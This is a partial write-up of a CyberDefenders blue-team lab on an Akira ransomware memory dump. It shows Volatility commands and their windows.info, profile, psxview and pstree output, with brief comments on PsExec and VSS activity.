https://cyberdefenders.org/blueteam-ctf-challenges/akira/

Scenario: 
>As a member of the DFIR team, you're tasked with investigating a ransomware attack involving Akira ransomware that has impacted critical systems. You’ve been provided with a memory dump from one of the compromised machines. Your goal is to analyze the memory for indicators of compromise, trace the ransomware’s entry point, and identify any malicious activity to assess the incident and guide the response strategy.


In preparation, I attempted to identify the Windows profile using Volatility 2 with `vol.exe -f "<path>\memory.dmp" imageinfo`, but it hangs for more than 10 minutes. I give it another try using the installed Volatility 3 in this hosted lab environment: `python vol.py -f "<path>\memory.dmp" windows.info`

The results:

```
Volatility 3 Framework 2.8.0
Progress:  100.00               PDB scanning finished
Variable        Value

Kernel Base     0xf8010420e000
DTB     0x1ad000
Symbols file:///C:/Users/Administrator/Desktop/Start%20Here/Tools/Memory%20Analysis/volatility3/volatility3/symbols/windows/ntkrnlmp.pdb/EF9A48AFA50FF07C616585BB01919536-1.json.xz
Is64Bit True
IsPAE   False
layer_name      0 WindowsIntel32e
memory_layer    1 WindowsCrashDump64Layer
base_layer      2 FileLayer
KdDebuggerDataBlock     0xf8010460ba80
NTBuildLab      17763.1.amd64fre.rs5_release.180
CSDVersion      0
KdVersionBlock  0xf8010460ef10
Major/Minor     15.17763
MachineType     34404
KeNumberProcessors      2
SystemTime      2024-09-18 12:01:43+00:00
NtSystemRoot    C:\Windows
NtProductType   NtProductServer
NtMajorVersion  10
NtMinorVersion  0
PE MajorOperatingSystemVersion  10
PE MinorOperatingSystemVersion  0
PE Machine      34404
PE TimeDateStamp        Sun Nov 10 07:20:39 2075
```

This lets us know the kdbg address is 0xf8010460ba80, and we identify the correct profile by using `vol.exe --info`:

```
Profiles
--------
VistaSP0x64           - A Profile for Windows Vista SP0 x64
VistaSP0x86           - A Profile for Windows Vista SP0 x86
VistaSP1x64           - A Profile for Windows Vista SP1 x64
VistaSP1x86           - A Profile for Windows Vista SP1 x86
VistaSP2x64           - A Profile for Windows Vista SP2 x64
VistaSP2x86           - A Profile for Windows Vista SP2 x86
Win10x64              - A Profile for Windows 10 x64
Win10x64_10586        - A Profile for Windows 10 x64 (10.0.10586.306 / 2016-04-23)
Win10x64_14393        - A Profile for Windows 10 x64 (10.0.14393.0 / 2016-07-16)
Win10x86              - A Profile for Windows 10 x86
Win10x86_10586        - A Profile for Windows 10 x86 (10.0.10586.420 / 2016-05-28)
Win10x86_14393        - A Profile for Windows 10 x86 (10.0.14393.0 / 2016-07-16)
Win2003SP0x86         - A Profile for Windows 2003 SP0 x86
[truncated]
```

The most recent profile is Win10x64_14393, so we'll use that. Unfortunately, as I proceed through the lab, the profile and kdbg address seem to be a persistent problem (and dropping both of them doesn't seem to be a serious performance issue). So I do without them.

Now, let's examine output from the Volatility 'psxview' plugin. We learned that PSEXESVC.exe was previously executed and had stopped running, and WmiPrvSE.exe (useful for lateral movement) as well as VSSVC.exe (Volume Shadow Copy Service, useful for extracting credentials) were actively running when memory was dumped:

| Offset(Virtual) | Name           | PID  | pslist | psscan | thrdscan | csrss | Exit Time                 |
| --------------- | -------------- | ---- | ------ | ------ | -------- | ----- | ------------------------- |
| 0xde855c463200  | System         | 4    | True   | True   | True     | False |                           |
| 0xde8560eda080  | wininit.exe    | 532  | True   | True   | True     | False |                           |
| 0xde855c50a080  | Registry       | 88   | True   | True   | True     | False |                           |
| 0xde8560f19080  | winlogon.exe   | 600  | True   | True   | True     | False |                           |
| 0xde8560f80080  | svchost.exe    | 804  | True   | True   | True     | False |                           |
| 0xde8560ed3080  | svchost.exe    | 924  | True   | True   | True     | False |                           |
| 0xde85616a2080  | dwm.exe        | 1016 | True   | True   | True     | False |                           |
| 0xde85616d6200  | svchost.exe    | 424  | True   | True   | True     | False |                           |
| 0xde85616d9280  | svchost.exe    | 544  | True   | True   | True     | False |                           |
| 0xde8561706280  | svchost.exe    | 964  | True   | True   | True     | False |                           |
| 0xde8561781080  | svchost.exe    | 1336 | True   | True   | True     | False |                           |
| 0xde855c5a4080  | spoolsv.exe    | 2288 | True   | True   | True     | False |                           |
| 0xde8561bdf080  | vmtoolsd.exe   | 2560 | True   | True   | True     | False |                           |
| 0xde8562093080  | WmiPrvSE.exe   | 3728 | True   | True   | True     | False |                           |
| 0xde8562235080  | svchost.exe    | 2328 | True   | True   | True     | False |                           |
| 0xde8561a0e200  | svchost.exe    | 1880 | True   | True   | True     | False |                           |
| 0xde8561b1d200  | svchost.exe    | 2376 | True   | True   | True     | False |                           |
| 0xde8561b65200  | svchost.exe    | 2452 | True   | True   | True     | False |                           |
| 0xde8561b47200  | wlms.exe       | 2624 | True   | True   | True     | False |                           |
| 0xde8561717280  | svchost.exe    | 1064 | True   | True   | True     | False |                           |
| 0xde8561745280  | svchost.exe    | 1128 | True   | True   | True     | False |                           |
| 0xde85626da280  | svchost.exe    | 5172 | True   | True   | True     | False |                           |
| 0xde8562adf080  | VSSVC.exe      | 1032 | True   | True   | True     | False |                           |
| 0xde8562034300  | LogonUI.exe    | 5744 | True   | True   | True     | False |                           |
| 0xde85624e0080  | ShellExperienc | 5016 | True   | True   | True     | False |                           |
| 0xde85624df080  | SearchUI.exe   | 4100 | True   | True   | True     | False |                           |
| 0xde8562280380  | RuntimeBroker. | 4784 | True   | True   | True     | False |                           |
| 0xde856278f080  | smartscreen.ex | 4832 | True   | True   | True     | False |                           |
| 0xde855c482080  | PSEXESVC.exe   | 1104 | False  | True   | False    | False | 2024-09-18 12:01:36+00:00 |
| 0xde856233c580  | userinit.exe   | 4532 | True   | True   | False    | False | 2024-09-18 11:00:15+00:00 |
| 0xde8562342580  | Sysmon.exe     | 1208 | True   | True   | True     | False |                           |
| 0xde855feeb140  | csrss.exe      | 428  | True   | True   | True     | False |                           |
| 0xde855fd920c0  | smss.exe       | 320  | True   | True   | True     | False |                           |
| 0xde8560edf140  | csrss.exe      | 540  | True   | True   | True     | False |                           |
| 0xde8560edd140  | services.exe   | 676  | True   | True   | True     | False |                           |
| 0xde8560f43140  | lsass.exe      | 684  | True   | True   | True     | False |                           |
| 0xde8561620140  | fontdrvhost.ex | 832  | True   | True   | True     | False |                           |
| 0xde8561622140  | fontdrvhost.ex | 836  | True   | True   | True     | False |                           |
| 0xde8561715240  | svchost.exe    | 1052 | True   | True   | True     | False |                           |
| 0xde85617042c0  | svchost.exe    | 828  | True   | True   | True     | False |                           |
| 0xde85617952c0  | svchost.exe    | 1452 | True   | True   | True     | False |                           |
| 0xde856288a080  | SecurityHealth | 4672 | True   | True   | True     | False |                           |
| 0xde8561ead080  | svchost.exe    | 360  | False  | True   | False    | False | 2024-09-18 12:01:36+00:00 |
| 0xde85624ee080  | RuntimeBroker. | 4572 | True   | True   | True     | False |                           |
| 0xde856206d240  | dllhost.exe    | 3408 | True   | True   | True     | False |                           |
| 0xde855c77c240  | msdtc.exe      | 4068 | True   | True   | True     | False |                           |
| 0xde85624ef080  | RuntimeBroker. | 388  | True   | True   | True     | False |                           |
| 0xde8561c112c0  | VGAuthService. | 2632 | True   | True   | True     | False |                           |
| 0xde8561e892c0  | svchost.exe    | 3024 | True   | True   | True     | False |                           |
| 0xde85622512c0  | sihost.exe     | 2268 | True   | True   | True     | False |                           |
| 0xde85622a02c0  | ctfmon.exe     | 4368 | True   | True   | True     | False |                           |
| 0xde856227a340  | taskhostw.exe  | 4124 | True   | True   | True     | False |                           |
| 0xde856229c2c0  | explorer.exe   | 4592 | True   | True   | True     | False |                           |
| 0xde85618c9340  | svchost.exe    | 5932 | True   | True   | True     | False |                           |
| 0xde8560f10080  | unsecapp.exe   | 4104 | True   | True   | True     | False |                           |
| 0xde8562b803c0  | vmtoolsd.exe   | 5716 | True   | True   | True     | False |                           |
| 0xde8560f11080  | backgroundTask | 4720 | True   | True   | True     | False |                           |
| 0xde85628d5080  | MsMpEng.exe    | 6072 | True   | True   | True     | False |                           |
| 0xde856220f080  | svchost.exe    | 4536 | True   | True   | True     | False |                           |
| 0xde8561b63640  | dllhost.exe    | 6048 | True   | True   | True     | False |                           |
| 0xde85619f3640  | ApplicationFra | 4668 | True   | True   | True     | False |                           |
| 0xde85618e96c0  | svchost.exe    | 1552 | True   | True   | True     | False |                           |

Then 'pstree' to review the process hierarchy (none of the results appeared anomalous):

| PID       | PPID | ImageFileName  | Offset(V)      | Threads | Handles | SessionId | Wow64 | CreateTime                     | ExitTime                       | Audit                                                                                                | Cmd                                                                                                                                                                                                                                                  | Path                                                                            |
| --------- | ---- | -------------- | -------------- | ------- | ------- | --------- | ----- | ------------------------------ | ------------------------------ | ---------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------- |
| 4         | 0    | System         | 0xde855c463200 | 196     | -       | N/A       | False | 2024-09-18 10:59:41.000000 UTC | N/A                            | -                                                                                                    | -                                                                                                                                                                                                                                                    | -                                                                               |
| * 88      | 4    | Registry       | 0xde855c50a080 | 4       | -       | N/A       | False | 2024-09-18 10:59:36.000000 UTC | N/A                            | Registry                                                                                             | -                                                                                                                                                                                                                                                    | -                                                                               |
| * 320     | 4    | smss.exe       | 0xde855fd920c0 | 2       | -       | N/A       | False | 2024-09-18 10:59:41.000000 UTC | N/A                            | \Device\HarddiskVolume4\Windows\System32\smss.exe                                                    | \SystemRoot\System32\smss.exe                                                                                                                                                                                                                        | \SystemRoot\System32\smss.exe                                                   |
| 428       | 420  | csrss.exe      | 0xde855feeb140 | 11      | -       | 0         | False | 2024-09-18 10:59:42.000000 UTC | N/A                            | \Device\HarddiskVolume4\Windows\System32\csrss.exe                                                   | %SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16 | C:\Windows\system32\csrss.exe                                                   |
| 532       | 420  | wininit.exe    | 0xde8560eda080 | 1       | -       | 0         | False | 2024-09-18 10:59:42.000000 UTC | N/A                            | \Device\HarddiskVolume4\Windows\System32\wininit.exe                                                 | wininit.exe                                                                                                                                                                                                                                          | C:\Windows\system32\wininit.exe                                                 |
| * 832     | 532  | fontdrvhost.ex | 0xde8561620140 | 5       | -       | 0         | False | 2024-09-18 10:59:43.000000 UTC | N/A                            | \Device\HarddiskVolume4\Windows\System32\fontdrvhost.exe                                             | "fontdrvhost.exe"                                                                                                                                                                                                                                    | C:\Windows\system32\fontdrvhost.exe                                             |
| * 684     | 532  | lsass.exe      | 0xde8560f43140 | 8       | -       | 0         | False | 2024-09-18 10:59:42.000000 UTC | N/A                            | \Device\HarddiskVolume4\Windows\System32\lsass.exe                                                   | C:\Windows\system32\lsass.exe                                                                                                                                                                                                                        | C:\Windows\system32\lsass.exe                                                   |
| * 676     | 532  | services.exe   | 0xde8560edd140 | 8       | -       | 0         | False | 2024-09-18 10:59:42.000000 UTC | N/A                            | \Device\HarddiskVolume4\Windows\System32\services.exe                                                | C:\Windows\system32\services.exe                                                                                                                                                                                                                     | C:\Windows\system32\services.exe                                                |
| ** 2560   | 676  | vmtoolsd.exe   | 0xde8561bdf080 | 14      | -       | 0         | False | 2024-09-18 10:59:44.000000 UTC | N/A                            | \Device\HarddiskVolume4\Program Files\VMware\VMware Tools\vmtoolsd.exe                               | "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"                                                                                                                                                                                                  | C:\Program Files\VMware\VMware Tools\vmtoolsd.exe                               |
| ** 1032   | 676  | VSSVC.exe      | 0xde8562adf080 | 10      | -       | 0         | False | 2024-09-18 12:01:31.000000 UTC | N/A                            | \Device\HarddiskVolume4\Windows\System32\VSSVC.exe                                                   | C:\Windows\system32\vssvc.exe                                                                                                                                                                                                                        | C:\Windows\system32\vssvc.exe                                                   |
| ** 2572   | 676  | vm3dservice.ex | 0xde8561c07080 | 4       | -       | 0         | False | 2024-09-18 10:59:44.000000 UTC | N/A                            | \Device\HarddiskVolume4\Windows\System32\vm3dservice.exe                                             | C:\Windows\system32\vm3dservice.exe                                                                                                                                                                                                                  | C:\Windows\system32\vm3dservice.exe                                             |
| *** 2808  | 2572 | vm3dservice.ex | 0xde8561cb1240 | 5       | -       | 1         | False | 2024-09-18 10:59:44.000000 UTC | N/A                            | \Device\HarddiskVolume4\Windows\System32\vm3dservice.exe                                             | C:\Windows\system32\vm3dservice.exe -n                                                                                                                                                                                                               | C:\Windows\system32\vm3dservice.exe                                             |
| ** 1552   | 676  | svchost.exe    | 0xde85618e96c0 | 4       | -       | 0         | False | 2024-09-18 10:59:43.000000 UTC | N/A                            | \Device\HarddiskVolume4\Windows\System32\svchost.exe                                                 | C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted -p                                                                                                                                                                                  | C:\Windows\system32\svchost.exe                                                 |
| ** 2452   | 676  | svchost.exe    | 0xde8561b65200 | 7       | -       | 0         | False | 2024-09-18 10:59:44.000000 UTC | N/A                            | \Device\HarddiskVolume4\Windows\System32\svchost.exe                                                 | C:\Windows\System32\svchost.exe -k smbsvcs                                                                                                                                                                                                           | C:\Windows\System32\svchost.exe                                                 |
| ** 2328   | 676  | svchost.exe    | 0xde8562235080 | 5       | -       | 0         | False | 2024-09-18 10:59:53.000000 UTC | N/A                            | \Device\HarddiskVolume4\Windows\System32\svchost.exe                                                 | C:\Windows\system32\svchost.exe -k appmodel -p                                                                                                                                                                                                       | C:\Windows\system32\svchost.exe                                                 |
| ** 1052   | 676  | svchost.exe    | 0xde8561715240 | 24      | -       | 0         | False | 2024-09-18 10:59:43.000000 UTC | N/A                            | \Device\HarddiskVolume4\Windows\System32\svchost.exe                                                 | C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p                                                                                                                                                                                   | C:\Windows\System32\svchost.exe                                                 |
| *** 4368  | 1052 | ctfmon.exe     | 0xde85622a02c0 | 8       | -       | 1         | False | 2024-09-18 10:59:54.000000 UTC | N/A                            | \Device\HarddiskVolume4\Windows\System32\ctfmon.exe                                                  | "ctfmon.exe"                                                                                                                                                                                                                                         | C:\Windows\system32\ctfmon.exe                                                  |
| ** 924    | 676  | svchost.exe    | 0xde8560ed3080 | 10      | -       | 0         | False | 2024-09-18 10:59:43.000000 UTC | N/A                            | \Device\HarddiskVolume4\Windows\System32\svchost.exe                                                 | C:\Windows\system32\svchost.exe -k RPCSS -p                                                                                                                                                                                                          | C:\Windows\system32\svchost.exe                                                 |
| ** 544    | 676  | svchost.exe    | 0xde85616d9280 | 25      | -       | 0         | False | 2024-09-18 10:59:43.000000 UTC | N/A                            | \Device\HarddiskVolume4\Windows\System32\svchost.exe                                                 | C:\Windows\System32\svchost.exe -k termsvcs                                                                                                                                                                                                          | C:\Windows\System32\svchost.exe                                                 |
| ** 804    | 676  | svchost.exe    | 0xde8560f80080 | 17      | -       | 0         | False | 2024-09-18 10:59:43.000000 UTC | N/A                            | \Device\HarddiskVolume4\Windows\System32\svchost.exe                                                 | C:\Windows\system32\svchost.exe -k DcomLaunch -p                                                                                                                                                                                                     | C:\Windows\system32\svchost.exe                                                 |
| *** 6048  | 804  | dllhost.exe    | 0xde8561b63640 | 6       | -       | 1         | False | 2024-09-18 11:00:25.000000 UTC | N/A                            | \Device\HarddiskVolume4\Windows\System32\dllhost.exe                                                 | C:\Windows\system32\DllHost.exe /Processid:{973D20D7-562D-44B9-B70B-5A0F49CCDF3F}                                                                                                                                                                    | C:\Windows\system32\DllHost.exe                                                 |
| *** 4832  | 804  | smartscreen.ex | 0xde856278f080 | 7       | -       | 1         | False | 2024-09-18 11:22:10.000000 UTC | N/A                            | \Device\HarddiskVolume4\Windows\System32\smartscreen.exe                                             | C:\Windows\System32\smartscreen.exe -Embedding                                                                                                                                                                                                       | C:\Windows\System32\smartscreen.exe                                             |
| *** 388   | 804  | RuntimeBroker. | 0xde85624ef080 | 3       | -       | 1         | False | 2024-09-18 10:59:56.000000 UTC | N/A                            | \Device\HarddiskVolume4\Windows\System32\RuntimeBroker.exe                                           | C:\Windows\System32\RuntimeBroker.exe -Embedding                                                                                                                                                                                                     | C:\Windows\System32\RuntimeBroker.exe                                           |
| *** 4100  | 804  | SearchUI.exe   | 0xde85624df080 | 13      | -       | 1         | False | 2024-09-18 12:01:36.000000 UTC | N/A                            | \Device\HarddiskVolume4\Windows\SystemApps\Microsoft.Windows.Cortana_cw5n1h2txyewy\SearchUI.exe      | "C:\Windows\SystemApps\Microsoft.Windows.Cortana_cw5n1h2txyewy\SearchUI.exe" -ServerName:CortanaUI.AppXa50dqqa5gqv4a428c9y1jjw7m3btvepj.mca                                                                                                          | C:\Windows\SystemApps\Microsoft.Windows.Cortana_cw5n1h2txyewy\SearchUI.exe      |
| *** 4104  | 804  | unsecapp.exe   | 0xde8560f10080 | 2       | -       | 0         | False | 2024-09-18 11:07:38.000000 UTC | N/A                            | \Device\HarddiskVolume4\Windows\System32\wbem\unsecapp.exe                                           | C:\Windows\system32\wbem\unsecapp.exe -Embedding                                                                                                                                                                                                     | C:\Windows\system32\wbem\unsecapp.exe                                           |
| *** 3728  | 804  | WmiPrvSE.exe   | 0xde8562093080 | 13      | -       | 0         | False | 2024-09-18 10:59:45.000000 UTC | N/A                            | \Device\HarddiskVolume4\Windows\System32\wbem\WmiPrvSE.exe                                           | C:\Windows\system32\wbem\wmiprvse.exe                                                                                                                                                                                                                | C:\Windows\system32\wbem\wmiprvse.exe                                           |
| *** 4784  | 804  | RuntimeBroker. | 0xde8562280380 | 3       | -       | 1         | False | 2024-09-18 10:59:56.000000 UTC | N/A                            | \Device\HarddiskVolume4\Windows\System32\RuntimeBroker.exe                                           | C:\Windows\System32\RuntimeBroker.exe -Embedding                                                                                                                                                                                                     | C:\Windows\System32\RuntimeBroker.exe                                           |
| *** 4720  | 804  | backgroundTask | 0xde8560f11080 | 7       | -       | 1         | False | 2024-09-18 12:01:42.000000 UTC | N/A                            | \Device\HarddiskVolume4\Windows\System32\backgroundTaskHost.exe                                      | "C:\Windows\system32\backgroundTaskHost.exe" -ServerName:CortanaUI.AppXy7vb4pc2dr3kc93kfc509b1d0arkfb2x.mca                                                                                                                                          | C:\Windows\system32\backgroundTaskHost.exe                                      |
| *** 5016  | 804  | ShellExperienc | 0xde85624e0080 | 16      | -       | 1         | False | 2024-09-18 10:59:55.000000 UTC | N/A                            | \Device\HarddiskVolume4\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe | "C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe" -ServerName:App.AppXtk181tbxbce2qsex02s8tw7hfxa9xb3t.mca                                                                                                           | C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe |
| *** 4572  | 804  | RuntimeBroker. | 0xde85624ee080 | 9       | -       | 1         | False | 2024-09-18 10:59:56.000000 UTC | N/A                            | \Device\HarddiskVolume4\Windows\System32\RuntimeBroker.exe                                           | C:\Windows\System32\RuntimeBroker.exe -Embedding                                                                                                                                                                                                     | C:\Windows\System32\RuntimeBroker.exe                                           |
| *** 4668  | 804  | ApplicationFra | 0xde85619f3640 | 1       | -       | 1         | False | 2024-09-18 11:01:17.000000 UTC | N/A                            | \Device\HarddiskVolume4\Windows\System32\ApplicationFrameHost.exe                                    | C:\Windows\system32\ApplicationFrameHost.exe -Embedding                                                                                                                                                                                              | C:\Windows\system32\ApplicationFrameHost.exe                                    |
| ** 424    | 676  | svchost.exe    | 0xde85616d6200 | 42      | -       | 0         | False | 2024-09-18 10:59:43.000000 UTC | N/A                            | \Device\HarddiskVolume4\Windows\System32\svchost.exe                                                 | C:\Windows\system32\svchost.exe -k netsvcs -p                                                                                                                                                                                                        | C:\Windows\system32\svchost.exe                                                 |
| *** 4592  | 424  | explorer.exe   | 0xde856229c2c0 | 43      | -       | 1         | False | 2024-09-18 10:59:54.000000 UTC | N/A                            | \Device\HarddiskVolume4\Windows\explorer.exe                                                         | C:\Windows\Explorer.EXE /NOUACCHECK                                                                                                                                                                                                                  | C:\Windows\Explorer.EXE                                                         |
| **** 5716 | 4592 | vmtoolsd.exe   | 0xde8562b803c0 | 9       | -       | 1         | False | 2024-09-18 11:00:07.000000 UTC | N/A                            | \Device\HarddiskVolume4\Program Files\VMware\VMware Tools\vmtoolsd.exe                               | "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe" -n vmusr                                                                                                                                                                                         | C:\Program Files\VMware\VMware Tools\vmtoolsd.exe                               |
| *** 2268  | 424  | sihost.exe     | 0xde85622512c0 | 14      | -       | 1         | False | 2024-09-18 10:59:53.000000 UTC | N/A                            | \Device\HarddiskVolume4\Windows\System32\sihost.exe                                                  | sihost.exe                                                                                                                                                                                                                                           | C:\Windows\system32\sihost.exe                                                  |
| *** 4124  | 424  | taskhostw.exe  | 0xde856227a340 | 6       | -       | 1         | False | 2024-09-18 10:59:53.000000 UTC | N/A                            | \Device\HarddiskVolume4\Windows\System32\taskhostw.exe                                               | taskhostw.exe {222A245B-E637-4AE9-A93F-A59CA119A75E}                                                                                                                                                                                                 | C:\Windows\system32\taskhostw.exe                                               |
| ** 1064   | 676  | svchost.exe    | 0xde8561717280 | 4       | -       | 0         | False | 2024-09-18 10:59:43.000000 UTC | N/A                            | \Device\HarddiskVolume4\Windows\System32\svchost.exe                                                 | C:\Windows\system32\svchost.exe -k LocalService                                                                                                                                                                                                      | C:\Windows\system32\svchost.exe                                                 |
| ** 1452   | 676  | svchost.exe    | 0xde85617952c0 | 12      | -       | 0         | False | 2024-09-18 10:59:43.000000 UTC | N/A                            | \Device\HarddiskVolume4\Windows\System32\svchost.exe                                                 | C:\Windows\system32\svchost.exe -k LocalServiceNoNetworkFirewall -p                                                                                                                                                                                  | C:\Windows\system32\svchost.exe                                                 |
| ** 5932   | 676  | svchost.exe    | 0xde85618c9340 | 3       | -       | 0         | False | 2024-09-18 11:01:18.000000 UTC | N/A                            | \Device\HarddiskVolume4\Windows\System32\svchost.exe                                                 | C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted                                                                                                                                                                                     | C:\Windows\System32\svchost.exe                                                 |
| ** 5172   | 676  | svchost.exe    | 0xde85626da280 | 7       | -       | 0         | False | 2024-09-18 11:00:00.000000 UTC | N/A                            | \Device\HarddiskVolume4\Windows\System32\svchost.exe                                                 | C:\Windows\System32\svchost.exe -k NetworkService -p                                                                                                                                                                                                 | C:\Windows\System32\svchost.exe                                                 |
| ** 1336   | 676  | svchost.exe    | 0xde8561781080 | 7       | -       | 0         | False | 2024-09-18 10:59:43.000000 UTC | N/A                            | \Device\HarddiskVolume4\Windows\System32\svchost.exe                                                 | C:\Windows\system32\svchost.exe -k LocalServiceNoNetwork -p                                                                                                                                                                                          | C:\Windows\system32\svchost.exe                                                 |
| ** 1208   | 676  | Sysmon.exe     | 0xde8562342580 | 15      | -       | 0         | False | 2024-09-18 11:07:38.000000 UTC | N/A                            | \Device\HarddiskVolume4\Windows\Sysmon.exe                                                           | C:\Windows\Sysmon.exe                                                                                                                                                                                                                                | C:\Windows\Sysmon.exe                                                           |
| ** 6072   | 676  | MsMpEng.exe    | 0xde85628d5080 | 8       | -       | 0         | False | 2024-09-18 11:10:54.000000 UTC | N/A                            | \Device\HarddiskVolume4\ProgramData\Microsoft\Windows Defender\Platform\4.18.24080.9-0\MsMpEng.exe   | "C:\ProgramData\Microsoft\Windows Defender\platform\4.18.24080.9-0\MsMpEng.exe"                                                                                                                                                                      | C:\ProgramData\Microsoft\Windows Defender\platform\4.18.24080.9-0\MsMpEng.exe   |
| ** 4536   | 676  | svchost.exe    | 0xde856220f080 | 8       | -       | 0         | False | 2024-09-18 12:01:31.000000 UTC | N/A                            | \Device\HarddiskVolume4\Windows\System32\svchost.exe                                                 | C:\Windows\System32\svchost.exe -k swprv                                                                                                                                                                                                             | C:\Windows\System32\svchost.exe                                                 |
| ** 828    | 676  | svchost.exe    | 0xde85617042c0 | 14      | -       | 0         | False | 2024-09-18 10:59:43.000000 UTC | N/A                            | \Device\HarddiskVolume4\Windows\System32\svchost.exe                                                 | C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -p                                                                                                                                                                                  | C:\Windows\System32\svchost.exe                                                 |
| ** 2624   | 676  | wlms.exe       | 0xde8561b47200 | 4       | -       | 0         | False | 2024-09-18 10:59:44.000000 UTC | N/A                            | \Device\HarddiskVolume4\Windows\System32\wlms\wlms.exe                                               | C:\Windows\system32\wlms\wlms.exe                                                                                                                                                                                                                    | C:\Windows\system32\wlms\wlms.exe                                               |
| ** 4672   | 676  | SecurityHealth | 0xde856288a080 | 4       | -       | 0         | False | 2024-09-18 11:39:20.000000 UTC | N/A                            | \Device\HarddiskVolume4\Windows\System32\SecurityHealthService.exe                                   | C:\Windows\system32\SecurityHealthService.exe                                                                                                                                                                                                        | C:\Windows\system32\SecurityHealthService.exe                                   |
| ** 964    | 676  | svchost.exe    | 0xde8561706280 | 22      | -       | 0         | False | 2024-09-18 10:59:43.000000 UTC | N/A                            | \Device\HarddiskVolume4\Windows\System32\svchost.exe                                                 | C:\Windows\system32\svchost.exe -k LocalService -p                                                                                                                                                                                                   | C:\Windows\system32\svchost.exe                                                 |
| ** 2376   | 676  | svchost.exe    | 0xde8561b1d200 | 11      | -       | 0         | False | 2024-09-18 10:59:44.000000 UTC | N/A                            | \Device\HarddiskVolume4\Windows\System32\svchost.exe                                                 | C:\Windows\System32\svchost.exe -k utcsvc -p                                                                                                                                                                                                         | C:\Windows\System32\svchost.exe                                                 |
| ** 2632   | 676  | VGAuthService. | 0xde8561c112c0 | 2       | -       | 0         | False | 2024-09-18 10:59:44.000000 UTC | N/A                            | \Device\HarddiskVolume4\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe            | "C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"                                                                                                                                                                               | C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe            |
| ** 3024   | 676  | svchost.exe    | 0xde8561e892c0 | 3       | -       | 0         | False | 2024-09-18 10:59:45.000000 UTC | N/A                            | \Device\HarddiskVolume4\Windows\System32\svchost.exe                                                 | C:\Windows\system32\svchost.exe -k NetworkServiceNetworkRestricted -p                                                                                                                                                                                | C:\Windows\system32\svchost.exe                                                 |
| ** 3408   | 676  | dllhost.exe    | 0xde856206d240 | 12      | -       | 0         | False | 2024-09-18 10:59:45.000000 UTC | N/A                            | \Device\HarddiskVolume4\Windows\System32\dllhost.exe                                                 | C:\Windows\system32\dllhost.exe /Processid:{02D4B3F1-FD88-11D1-960D-00805FC79235}                                                                                                                                                                    | C:\Windows\system32\dllhost.exe                                                 |
| ** 1880   | 676  | svchost.exe    | 0xde8561a0e200 | 16      | -       | 0         | False | 2024-09-18 10:59:43.000000 UTC | N/A                            | \Device\HarddiskVolume4\Windows\System32\svchost.exe                                                 | C:\Windows\system32\svchost.exe -k netsvcs                                                                                                                                                                                                           | C:\Windows\system32\svchost.exe                                                 |
| ** 4068   | 676  | msdtc.exe      | 0xde855c77c240 | 9       | -       | 0         | False | 2024-09-18 10:59:46.000000 UTC | N/A                            | \Device\HarddiskVolume4\Windows\System32\msdtc.exe                                                   | C:\Windows\System32\msdtc.exe                                                                                                                                                                                                                        | C:\Windows\System32\msdtc.exe                                                   |
| ** 1128   | 676  | svchost.exe    | 0xde8561745280 | 19      | -       | 0         | False | 2024-09-18 10:59:43.000000 UTC | N/A                            | \Device\HarddiskVolume4\Windows\System32\svchost.exe                                                 | C:\Windows\system32\svchost.exe -k NetworkService -p                                                                                                                                                                                                 | C:\Windows\system32\svchost.exe                                                 |
| ** 2288   | 676  | spoolsv.exe    | 0xde855c5a4080 | 10      | -       | 0         | False | 2024-09-18 10:59:44.000000 UTC | N/A                            | \Device\HarddiskVolume4\Windows\System32\spoolsv.exe                                                 | C:\Windows\System32\spoolsv.exe                                                                                                                                                                                                                      | C:\Windows\System32\spoolsv.exe                                                 |
| 540       | 524  | csrss.exe      | 0xde8560edf140 | 11      | -       | 1         | False | 2024-09-18 10:59:42.000000 UTC | N/A                            | \Device\HarddiskVolume4\Windows\System32\csrss.exe                                                   | %SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16 | C:\Windows\system32\csrss.exe                                                   |
| 600       | 524  | winlogon.exe   | 0xde8560f19080 | 4       | -       | 1         | False | 2024-09-18 10:59:42.000000 UTC | N/A                            | \Device\HarddiskVolume4\Windows\System32\winlogon.exe                                                | winlogon.exe                                                                                                                                                                                                                                         | C:\Windows\system32\winlogon.exe                                                |
| * 1016    | 600  | dwm.exe        | 0xde85616a2080 | 13      | -       | 1         | False | 2024-09-18 10:59:43.000000 UTC | N/A                            | \Device\HarddiskVolume4\Windows\System32\dwm.exe                                                     | "dwm.exe"                                                                                                                                                                                                                                            | C:\Windows\system32\dwm.exe                                                     |
| * 4532    | 600  | userinit.exe   | 0xde856233c580 | 0       | -       | 1         | False | 2024-09-18 10:59:54.000000 UTC | 2024-09-18 11:00:15.000000 UTC | \Device\HarddiskVolume4\Windows\System32\userinit.exe                                                | -                                                                                                                                                                                                                                                    | -                                                                               |
| * 5744    | 600  | LogonUI.exe    | 0xde8562034300 | 14      | -       | 1         | False | 2024-09-18 11:50:17.000000 UTC | N/A                            | \Device\HarddiskVolume4\Windows\System32\LogonUI.exe                                                 | "LogonUI.exe" /flags:0x0 /state0:0xa38b8055 /state1:0x41c64e6d                                                                                                                                                                                       | C:\Windows\system32\LogonUI.exe                                                 |
